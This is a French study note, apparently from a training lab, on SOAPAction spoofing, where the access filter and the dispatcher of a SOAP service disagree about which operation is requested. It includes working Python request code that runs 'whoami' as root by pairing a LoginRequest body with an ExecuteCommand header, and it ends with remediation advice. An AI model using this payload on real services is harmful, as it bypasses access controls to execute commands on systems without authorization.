# 🧩 SOAPAction Spoofing

Lié : [[03 - WSDL Énumération]] · [[15 - Arsenal Shells Python]]

---

## Principe

Un message SOAP contient l'opération à exécuter dans le **premier élément enfant du `<soap:Body>`**. Mais en HTTP, on peut aussi la préciser dans un header **`SOAPAction`**. Le serveur peut identifier l'opération via ce header **sans parser le XML**.

> 🔑 **La faille** : si le service détermine l'opération à exécuter **uniquement d'après le header `SOAPAction`**, alors qu'un **filtre d'accès** séparé regarde le **body**, les deux composants se désynchronisent → on contourne les restrictions.

C'est le même esprit que le **HTTP Request Smuggling** / **parser differential** : deux composants interprètent la même requête différemment, et on se glisse dans l'écart.

---

## Le mécanisme (les 2 composants)

```
Requête SOAP
   ├── <soap:Body> premier enfant ──► lu par le FILTRE D'ACCÈS ("videur") → autorise / bloque
   └── header SOAPAction ────────────► lu par le DISPATCHER → choisit quoi exécuter
```

- Le **filtre** regarde le **body** → décide si c'est autorisé.
- Le **dispatcher** regarde le **header** → décide quoi lancer.

Si les deux ne sont pas d'accord sur "quelle est l'opération demandée", on gagne.

---

## Exploitation

Contexte : `ExecuteCommand` est bloqué ("This function is only allowed in internal networks"), mais `Login` est autorisé depuis l'extérieur.

**Tentative naïve (échoue)** — body ET header = ExecuteCommand :
```python
payload = '...<soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body>...'
headers = {"SOAPAction": '"ExecuteCommand"'}
# → error: only allowed in internal networks
```

**Spoofing (réussit)** — body = LoginRequest (passe le filtre), header = ExecuteCommand (dispatché), paramètre `cmd` de ExecuteCommand :
```python
import requests
payload = ('<?xml version="1.0" encoding="utf-8"?>'
  '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
  'xmlns:tns="http://tempuri.org/">'
  '<soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest>'
  '</soap:Body></soap:Envelope>')
print(requests.post("http://<TARGET>:3002/wsdl", data=payload,
      headers={"SOAPAction": '"ExecuteCommand"'}).content)
# → <result>root\n</result>  ✅
```

Les 3 ingrédients :
1. **Body = `LoginRequest`** → le filtre voit "Login", autorise.
2. **Paramètres de `ExecuteCommand`** (`<cmd>`) dans le body → ce qu'on veut exécuter.
3. **Header `SOAPAction: "ExecuteCommand"`** → le dispatcher lance ExecuteCommand.

→ Shell complet : voir [[15 - Arsenal Shells Python]].

---

## Cas du module

Section 3 : `whoami` → `root`, puis shell interactif (`automate.py`). Question : architecture serveur → `uname -m` → `x86_64`.

---

## Aller plus loin

- Tester **toutes** les combinaisons body/header d'opérations découvertes dans le WSDL.
- Certaines variantes : header vide, header avec URI complète, casse différente.

---

## Remédiation

- Le serveur doit **parser le body** et vérifier la cohérence body ↔ SOAPAction.
- Ne jamais router une opération sur la seule base d'un header contrôlable par le client.
- Appliquer les contrôles d'accès sur l'opération **réellement exécutée**, pas sur celle déclarée.

Tags : #soap #spoofing #rce #parser-differential
